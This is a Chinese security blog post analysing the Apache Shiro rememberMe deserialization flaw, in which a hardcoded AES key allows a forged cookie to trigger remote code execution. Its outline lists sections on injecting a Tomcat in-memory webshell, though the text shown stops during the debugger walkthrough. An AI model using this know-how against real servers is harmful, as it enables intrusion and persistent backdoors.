<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="shiro反序列化漏洞 漏洞原理shiro框架中cookie中的rememberMe字段存储的是java序列化后的数据，并且通过AES加密和base64编码后传输，但由于框架中以硬编码的形式存储了AES加密的key，导致了攻击者可以构造恶意的序列化数据，在服务端进行反序列化时造成rce。影响版本为&lt;1.2.4 漏洞分析造成漏洞的主要原因还是硬编码造成的，这里就直接对Cookie中remem">
<meta property="og:type" content="article">
<meta property="og:title" content="shiro反序列化写入内存马">
<meta property="og:url" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/index.html">
<meta property="og:site_name" content="之间太多空白">
<meta property="og:description" content="shiro反序列化漏洞 漏洞原理shiro框架中cookie中的rememberMe字段存储的是java序列化后的数据，并且通过AES加密和base64编码后传输，但由于框架中以硬编码的形式存储了AES加密的key，导致了攻击者可以构造恶意的序列化数据，在服务端进行反序列化时造成rce。影响版本为&lt;1.2.4 漏洞分析造成漏洞的主要原因还是硬编码造成的，这里就直接对Cookie中remem">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636029345143-57def6b9-365d-41fc-925f-3d067cf4b255.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636029709555-948b587a-b2b1-49ca-ba09-30caee6bff47.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032633431-61f7895f-5b5e-46bb-95bc-1c65d28cb971.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636030705543-3e58aec9-e313-4901-8d4c-3c5fbd25b32e.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636030999027-82b1c6da-460d-4e0c-a688-561b235cfe17.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031158692-af57b56e-000e-4fe6-aa6a-8d0d337bac60.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031350495-638d7dcd-83f0-4861-b90e-7c2bc647b1f3.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031442683-519d226e-042e-4967-9379-b2e5f39239cb.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031558886-46ba1f9c-cfd8-4a48-b768-82c38edeb435.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031586449-65be49de-e98c-4b1d-b629-6e42198b119b.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032019157-29a86dfe-8f23-4631-8938-39ba46f0ee8f.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032252167-d82abef7-fd24-4db1-8640-66214136d092.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032334531-bbdcfea9-bac8-471c-9845-e5e81f9c9f98.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032363698-fd536023-dfb4-4feb-a642-40dc7aaa2df5.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032386770-58e3bf22-7378-4799-905d-570c037ba6cf.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636036019217-07cd508a-653b-476f-b646-597c56400b1d.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636036123443-193de81c-3755-4f26-b79e-54db39f19248.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636038384514-b3ebbcdf-0f55-4afd-920c-2e2c389eb578.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636038430731-334b9ce3-7191-4891-b3f4-2c60acac33ef.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636122259117-198b9ac3-4d93-48c0-86b5-835b2da05fab.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636183059973-212d3b91-487d-4269-80e2-0cd33aa77c56.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636183153434-ada3e457-6c38-40a4-b7c7-52763b4bbf5f.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636183302383-dab5bde6-3145-4c3e-9572-04aece45d65e.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636185042452-2bae89b6-b873-4d89-b5a7-2c0926002f77.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636186653947-fba57549-80d4-4fc5-b05a-b065671304ff.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636187969962-440923a5-c2e3-4d16-897f-3239c9d779c1.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636188157687-306e2b02-b259-441d-b15e-51b29780a976.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636189425311-c64789d8-f608-41a4-9a20-4520b64911c3.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636189523251-607309f1-e989-48b3-9e20-adc050b3ed2b.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636190469043-7096d320-2889-4eb3-b150-b8f3eab8333c.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636191461274-ae27a566-8e27-407a-9a50-7d6e39ae52b7.png">
<meta property="og:image" content="https://oh3r-blog.oss-cn-beijing.aliyuncs.com/blog1636191866586-6444dfd8-5753-4453-aa93-0fffef0b6584.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636192530220-57daab9a-cec6-4661-903a-b84592440dd5.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636194060184-dce952d0-4a3b-463a-a92b-76f9054ea76e.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636195035492-a34d02c9-8082-493c-9c9d-d3f021d7bd73.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636195132598-7f5be2d8-200d-45e1-b905-32f26258e6e6.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636196050555-62a53ba5-7e29-4ded-ba0a-2df609fe6e08.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636199412962-59f97b1a-673a-4eda-a69e-7fc23bb49d25.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636199563980-533ac2fc-6786-40e2-8cf9-aff12b193efa.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636286041518-94f554a4-de74-4c04-81f6-8ff23ffb4123.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636286256338-410c5361-3a16-415d-9675-818792f4d59b.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636299198027-777b36ff-1ebb-4e0d-9c20-32388c3fbdda.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636286348140-ab464945-6277-43e4-9535-4c5e0502c1a2.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636287016994-c6d3574e-d514-4189-9e4a-81f67d4fb3a8.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636287003534-623ce61a-8856-4877-8d34-13ab0ad7a034.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636367401058-f34e4cd8-e861-4b89-a436-6cccbed1512f.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636369139113-9b9a35a1-aefb-4f7c-81c3-90386b5bd28c.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636369226989-bfe3fac1-f457-442b-9b2d-6e5671eb98c8.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636370333295-34e68242-f639-423f-8e63-bd45e454e0b8.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636370368281-52ed3250-5184-42ee-b0a2-75706c1d8d7c.png">
<meta property="og:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636370401611-3b3f3e78-dc47-4f71-8bb8-1ed67f99223e.png">
<meta property="article:published_time" content="2021-11-09T11:45:21.000Z">
<meta property="article:modified_time" content="2024-07-28T09:43:28.240Z">
<meta property="article:author" content="yy">
<meta property="article:tag" content="java">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636029345143-57def6b9-365d-41fc-925f-3d067cf4b255.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/logo.JPG">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/logo.JPG" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.JPG">
        
      
    
    <!-- title -->
    <title>shiro反序列化写入内存马</title>
    <!-- async scripts -->
    <!-- Google Analytics -->


    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">首页</a></li><!--
     --><!--
       --><li><a href="/about/">关于</a></li><!--
     --><!--
       --><li><a href="/archives/">归档</a></li><!--
     --><!--
       --><li><a href="/tags/">标签</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="http://github.com/yaoyao-cool">项目</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇" href="/2023/04/04/HTB-Authority/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&text=shiro反序列化写入内存马"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&is_video=false&description=shiro反序列化写入内存马"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=shiro反序列化写入内存马&body=Check out this article: http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&title=shiro反序列化写入内存马"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&name=shiro反序列化写入内存马&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://oh3r.vip/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/&t=shiro反序列化写入内存马"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">1.</span> <span class="toc-text">shiro反序列化漏洞</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.1.</span> <span class="toc-text">漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90"><span class="toc-number">1.2.</span> <span class="toc-text">漏洞分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC"><span class="toc-number">1.3.</span> <span class="toc-text">利用脚本</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Tomcat%E5%86%85%E5%AD%98webshell"><span class="toc-number">2.</span> <span class="toc-text">Tomcat内存webshell</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%8E%B7%E5%8F%96%E4%B8%8A%E4%B8%8B%E6%96%87%E5%AF%B9%E8%B1%A1"><span class="toc-number">2.1.</span> <span class="toc-text">获取上下文对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%B3%A8%E5%86%8CFilter"><span class="toc-number">2.2.</span> <span class="toc-text">注册Filter</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87StandardContext"><span class="toc-number">2.2.1.</span> <span class="toc-text">通过StandardContext</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%80%9A%E8%BF%87ApplicationContext"><span class="toc-number">2.2.2.</span> <span class="toc-text">通过ApplicationContext</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E4%B8%8Eshiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E7%BB%93%E5%90%88"><span class="toc-number">3.</span> <span class="toc-text">与shiro反序列化漏洞结合</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%A7%A3%E5%86%B3%E2%80%9CRequest-header-is-too-large%E2%80%9D"><span class="toc-number">4.</span> <span class="toc-text">解决“Request header is too large”</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8A%A0%E8%BD%BD%E5%AD%97%E8%8A%82%E7%A0%81"><span class="toc-number">4.1.</span> <span class="toc-text">加载字节码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%AE%E6%94%B9size"><span class="toc-number">4.2.</span> <span class="toc-text">修改size</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%80%82%E9%85%8D%E5%86%B0%E8%9D%8E"><span class="toc-number">5.</span> <span class="toc-text">适配冰蝎</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        shiro反序列化写入内存马
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">yy</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-11-09T11:45:21.000Z" class="dt-published" itemprop="datePublished">2021-11-09</time>
        
      
    </div>


      

      
    <div class="article-tag">
        <i class="fa-solid fa-tag"></i>
        <a class="p-category" href="/tags/java/" rel="tag">java</a>
    </div>


    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <p><a name="rSgpU"></a></p>
<h1 id="shiro反序列化漏洞"><a href="#shiro反序列化漏洞" class="headerlink" title="shiro反序列化漏洞"></a>shiro反序列化漏洞</h1><p><a name="Zx0cC"></a></p>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>shiro框架中cookie中的rememberMe字段存储的是java序列化后的数据，并且通过AES加密和base64编码后传输，但由于框架中以硬编码的形式存储了AES加密的key，导致了攻击者可以构造恶意的序列化数据，在服务端进行反序列化时造成rce。<br>影响版本为&lt;1.2.4<br><a name="dMTkd"></a></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>造成漏洞的主要原因还是硬编码造成的，这里就直接对Cookie中rememberMe的解密到反序列化的过程分析一下。<br>环境：<br>github 拉一个shiro下来，切到1.2.4版本，直接用idea打开sample-web目录，在idea中配置一个tomcat就好了。<br></p>
<p><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636029345143-57def6b9-365d-41fc-925f-3d067cf4b255.png" alt="image.png"><br>先从处理rememberMe的入口点分析<br><code>org.apache.shiro.mgt.AbstractRememberMeManager#getRememberedPrincipals</code>这个方法，先打个断点，随便发个包就能触发这个函数。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636029709555-948b587a-b2b1-49ca-ba09-30caee6bff47.png" alt="image.png"><br>跟进一下<code>getRememberedSerializedIdentity</code>函数，取出了Cookie中的rememberMe,并且base64解码。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636032633431-61f7895f-5b5e-46bb-95bc-1c65d28cb971.png" alt="image.png"><br>跟进<code>convertBytesToPrincipals</code>函数，可以看到这里用的加密算法：<code>AES/CBC/PKCS5Padding</code><br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636030705543-3e58aec9-e313-4901-8d4c-3c5fbd25b32e.png" alt="image.png"><br>继续跟进<code>decrypt</code>函数<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636030999027-82b1c6da-460d-4e0c-a688-561b235cfe17.png" alt="image.png"><br>这里调用了解密函数<code>cipherService.decrypt</code>，其中的第一个参数<code>encrypted</code>就是rememberMe，第二个参数盲猜就是硬编码的key，为了证明，这里再跟一下。<br><img src="/2021/11/09/shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%86%99%E5%85%A5%E5%86%85%E5%AD%98%E9%A9%AC/blog1636031158692-af57b56e-000e-4fe6-aa6a-8d0d337bac60.png" alt="image.png"><br>返回了<code>AbstractRememberMeManager</code>类中的<code>decryptionCipherKey</code>属性，可以看出是个javaBean，有get肯定有set，<br><img 